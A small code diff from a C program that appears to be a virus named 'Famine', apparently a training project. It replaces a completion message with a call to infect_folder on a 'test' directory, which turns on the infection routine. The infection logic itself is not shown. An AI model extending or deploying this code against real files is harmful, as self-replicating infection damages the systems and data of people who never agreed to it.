@@ -81,9 +81,8 @@ void				init_famine(int argc, char **argv)
 		if (famine->debug == true) {
 			start_debug_console();
 		}
-
-		
-		print_message(famine, "Famine job's done !");
+		infect_folder(famine, "test");
+		//print_message(famine, "Famine job's done !");
 		if (famine->debug == true) {
 			while (true) ;
 		}
